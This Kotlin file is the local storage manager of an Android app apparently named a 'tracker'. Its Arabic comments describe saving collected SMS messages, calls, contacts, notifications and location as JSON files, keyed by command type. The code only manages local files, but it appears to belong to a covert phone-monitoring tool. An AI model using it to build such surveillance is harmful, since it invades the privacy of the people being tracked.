package com.abuzahra.tracker

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * LocalStorageManager - إدارة التخزين المحلي للبيانات
 * يحفظ جميع البيانات المجمعة (رسائل، مكالمات، جهات اتصال، إشعارات، موقع، إلخ)
 * في ملفات JSON داخل التخزين الداخلي للتطبيق
 *
 * المسار: /data/data/com.abuzahra.tracker/files/alzahra_data/
 */
object LocalStorageManager {

    private const val TAG = "LocalStorageManager"
    private const val DATA_DIR = "alzahra_data"
    private val gson = Gson()

    /**
     * حفظ البيانات محلياً كملف JSON
     *
     * @param context سياق التطبيق
     * @param command نوع الأمر (sms, calls, contacts, location, etc.)
     * @param data البيانات المراد حفظها (أي كائن قابل للتحويل لـ JSON)
     *
     * اسم الملف: {command}_{timestamp}.json
     * مثال: sms_1703123456789.json
     */
    fun storeData(context: Context, command: String, data: Any) {
        try {
            // إنشاء مجلد البيانات إذا لم يكن موجوداً
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) {
                val created = dir.mkdirs()
                if (!created) {
                    Log.e(TAG, "فشل إنشاء مجلد التخزين: ${dir.absolutePath}")
                    return
                }
            }

            // إنشاء اسم ملف فريد: نوع الأمر + طابع زمني
            val timestamp = System.currentTimeMillis()
            val fileName = "${command}_${timestamp}.json"
            val file = File(dir, fileName)

            // تحويل البيانات لـ JSON وكتابتها
            val jsonContent = gson.toJson(data)
            file.writeText(jsonContent)

            Log.d(TAG, "تم حفظ بيانات [$command] في: ${file.name} (${jsonContent.length} bytes)")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حفظ بيانات [$command]: ${e.message}", e)
        }
    }

    /**
     * قراءة جميع البيانات المحلية لنوع أمر محدد
     *
     * @param context سياق التطبيق
     * @param command نوع الأمر
     * @return قائمة بالبيانات كسلاسل JSON
     */
    fun readData(context: Context, command: String): List<String> {
        val results = mutableListOf<String>()
        try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return results

            // البحث عن ملفات تطابق نوع الأمر
            val pattern = Regex("^${command}_\\d+\\.json$")
            dir.listFiles()
                ?.filter { it.isFile && it.name.matches(pattern) }
                ?.sortedByDescending { it.lastModified() }
                ?.forEach { file ->
                    try {
                        results.add(file.readText())
                    } catch (e: Exception) {
                        Log.e(TAG, "خطأ في قراءة ملف ${file.name}: ${e.message}")
                    }
                }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في قراءة بيانات [$command]: ${e.message}", e)
        }
        return results
    }

    /**
     * الحصول على قائمة بجميع الملفات المحفوظة
     *
     * @param context سياق التطبيق
     * @return قائمة الملفات مرتبة من الأحدث للأقدم
     */
    fun getAllFiles(context: Context): List<File> {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return emptyList()

            dir.listFiles()
                ?.filter { it.isFile && it.extension == "json" }
                ?.sortedByDescending { it.lastModified() }
                ?: emptyList()
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جلب الملفات: ${e.message}", e)
            emptyList()
        }
    }

    /**
     * الحصول على حجم التخزين المستخدم بالبايت
     *
     * @param context سياق التطبيق
     * @return الحجم الإجمالي للملفات بالبايت
     */
    fun getStorageUsage(context: Context): Long {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return 0

            dir.walkTopDown()
                .filter { it.isFile }
                .sumOf { it.length() }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حساب حجم التخزين: ${e.message}", e)
            0
        }
    }

    /**
     * الحصول على حجم التخزين كنص مقروء
     *
     * @param context سياق التطبيق
     * @return النص المقروء (مثال: "2.5 MB")
     */
    fun getStorageUsageFormatted(context: Context): String {
        val bytes = getStorageUsage(context)
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> String.format("%.1f KB", bytes / 1024.0)
            bytes < 1024 * 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024.0))
            else -> String.format("%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0))
        }
    }

    /**
     * الحصول على عدد الملفات المحفوظة
     *
     * @param context سياق التطبيق
     * @return عدد الملفات
     */
    fun getFileCount(context: Context): Int {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return 0
            dir.listFiles()?.count { it.isFile && it.extension == "json" } ?: 0
        } catch (e: Exception) {
            0
        }
    }

    /**
     * تنظيف البيانات القديمة مع الاحتفاظ بآخر N ملف
     * يحافظ على مساحة التخزين نظيفة ويمنع امتلاء الذاكرة
     *
     * @param context سياق التطبيق
     * @param keepLast عدد الملفات المراد الاحتفاظ بها (الافتراضي: 100)
     * @return عدد الملفات المحذوفة
     */
    fun clearOldData(context: Context, keepLast: Int = 100): Int {
        var deletedCount = 0
        try {
            val files = getAllFiles(context)
            if (files.size <= keepLast) return 0

            // حذف الملفات القديمة (من نهاية القائمة - لأنها مرتبة من الأحدث للأقدم)
            val filesToDelete = files.drop(keepLast)
            filesToDelete.forEach { file ->
                if (file.delete()) {
                    deletedCount++
                }
            }

            if (deletedCount > 0) {
                Log.d(TAG, "تم حذف $deletedCount ملف قديم (محتفظ بـ $keepLast)")
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في تنظيف البيانات: ${e.message}", e)
        }
        return deletedCount
    }

    /**
     * حذف جميع البيانات المحلية
     *
     * @param context سياق التطبيق
     * @return true إذا نجح الحذف
     */
    fun clearAllData(context: Context): Boolean {
        return try {
            val dir = File(context.filesDir, DATA_DIR)
            if (dir.exists()) {
                dir.deleteRecursively()
                Log.d(TAG, "تم حذف جميع البيانات المحلية")
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حذف جميع البيانات: ${e.message}", e)
            false
        }
    }

    /**
     * حذف ملفات نوع أمر محدد
     *
     * @param context سياق التطبيق
     * @param command نوع الأمر
     * @return عدد الملفات المحذوفة
     */
    fun clearDataForCommand(context: Context, command: String): Int {
        var deletedCount = 0
        try {
            val dir = File(context.filesDir, DATA_DIR)
            if (!dir.exists()) return 0

            val pattern = Regex("^${command}_\\d+\\.json$")
            dir.listFiles()
                ?.filter { it.isFile && it.name.matches(pattern) }
                ?.forEach { file ->
                    if (file.delete()) deletedCount++
                }

            if (deletedCount > 0) {
                Log.d(TAG, "تم حذف $deletedCount ملف من نوع [$command]")
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حذف بيانات [$command]: ${e.message}", e)
        }
        return deletedCount
    }

    /**
     * الحصول على ملخص التخزين المحلي
     * يُستخدم لعرض حالة التخزين في واجهة المستخدم
     *
     * @param context سياق التطبيق
     * @return خريطة تحتوي على إحصائيات التخزين
     */
    fun getStorageSummary(context: Context): Map<String, Any> {
        val files = getAllFiles(context)
        val totalSize = getStorageUsage(context)

        // تجميع عدد الملفات لكل نوع أمر
        val commandCounts = mutableMapOf<String, Int>()
        files.forEach { file ->
            val command = file.nameWithoutExtension.substringBefore("_")
            commandCounts[command] = (commandCounts[command] ?: 0) + 1
        }

        return mapOf<String, Any>(
            "total_files" to files.size,
            "total_size_bytes" to totalSize,
            "total_size_formatted" to getStorageUsageFormatted(context),
            "command_counts" to commandCounts,
            "oldest_file" to (files.lastOrNull()?.name ?: "none"),
            "newest_file" to (files.firstOrNull()?.name ?: "none")
        )
    }
}
